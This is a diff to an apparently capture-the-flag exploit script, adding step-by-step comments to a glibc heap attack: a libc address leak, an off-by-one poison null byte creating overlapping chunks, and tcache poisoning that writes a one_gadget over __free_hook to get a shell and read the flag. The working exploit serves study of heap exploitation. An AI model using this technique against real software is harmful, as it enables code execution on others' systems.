@@ -70,51 +70,51 @@ def challenge_do_del(idx: bytes):
 io = start()
 
 # leak libc base
-challenge_do_str(str(0x420).encode(), b"a")     # 0 : unsorted bin
-challenge_do_str(str(0x10).encode(), b"a")      # 1 : barrier
-challenge_do_del(b"0")                          # del 0
-challenge_do_str(str(0x420).encode(), b"a"*8)   # 0 : leak info left from unsorted bin
-challenge_do_tok(b"0", b"\x01")                 # leak
+challenge_do_str(str(0x420).encode(), b"a")     # idx 0 : largest size of tcache is 0x410 so we create a chunk of size 0x420
+challenge_do_str(str(0x10).encode(), b"a")      # idx 1 : barrier with topchunk
+challenge_do_del(b"0")                          # del 0 : => unsorted bin
+challenge_do_str(str(0x420).encode(), b"a"*8)   # idx 0 : re allocate chunk inside unsorted bin to leak main_arena address inside it
+challenge_do_tok(b"0", b"\x01")                 # exploit `info leak vulnerability`
 
 leaked_libc = io.recvline()[-7:-1] + b"\x00"*2
 leaked_libc = u64(leaked_libc)
-diff = 0x3ebca0
+diff = 0x3ebca0 # distance diff from leaked address with libc base
 libc.address = leaked_libc - diff
 log.success(f"libc.address: {hex(libc.address)}")
 # --- end ---
 
-# test space
+# poison null byte
 
 challenge_do_str(str(0x18).encode(), b"z"*0x18)                         # 2 (a)
-challenge_do_str(str(0x550).encode(), b"b"*0x4f0 + p64(0x500))          # 3 (b)
+challenge_do_str(str(0x550).encode(), b"b"*0x4f0 + p64(0x500))          # 3 (b): p64(0x500) used to bypass security check `corrupted size vs. prev_size`
 challenge_do_str(str(0x550).encode(), b"c"*0x550)                       # 4 (c)
 challenge_do_str(str(0x100).encode(), b"d"*0x100)                       # 5: barrier
 
-challenge_do_del(b"3")                                                  # del 3
-challenge_do_tok(b"2", b"\x61")                                         # null of by one => chunk 3 size = 0x500
+challenge_do_del(b"3")                                                  # del 3 (b)
+challenge_do_tok(b"2", b"\x61")                                         # off-by-one Poison NULL byte => chunk 3's size = 0x500
 
 challenge_do_str(str(0x480).encode(), b"e"*0x18)                        # 3 (b1)
 challenge_do_str(str(0x60).encode(), b"f"*0x18)                         # 6 (b2)
 
-challenge_do_del(b"3")
-challenge_do_del(b"4")
+challenge_do_del(b"3") # del 3 (b1)
+challenge_do_del(b"4") # del 4 (c): trigger unlink(b1) => chunk b2 overlapping with newly merged chunk by unlink
 
-challenge_do_del(b"6")
+challenge_do_del(b"6") # throw b2 to tcache bin
 
-challenge_do_str(str(0xa00).encode(), b"a"*(0x480 + 0x10) + p64(libc.symbols['__free_hook']))
+challenge_do_str(str(0xa00).encode(), b"a"*(0x480 + 0x10) + p64(libc.symbols['__free_hook'])) # create a chunk overlaps with b2 and write to b2->next the address of __free_hook
 
-challenge_do_str(str(0x60).encode(), b"a")
+challenge_do_str(str(0x60).encode(), b"a") # entry = b2-next (__free_hook)
 
 # one_gadget = 0x4f29e
 # one_gadget = 0x4f2a5
-one_gadget = 0x4f302
+one_gadget = 0x4f302 # this one_gadget worked
 # one_gadget = 0x10a2fc
 
-challenge_do_str(str(0x60).encode(), p64(libc.address + one_gadget))
+challenge_do_str(str(0x60).encode(), p64(libc.address + one_gadget)) # arbitrary write: write one_gadget to __free_hook
 
-challenge_do_del(b"5")
+challenge_do_del(b"5") # trigger __free_hook
 
-io.sendline(b"cat flag.txt")
+io.sendline(b"cat flag.txt") # boom
 log.success(io.recvline())
 io.close()
 
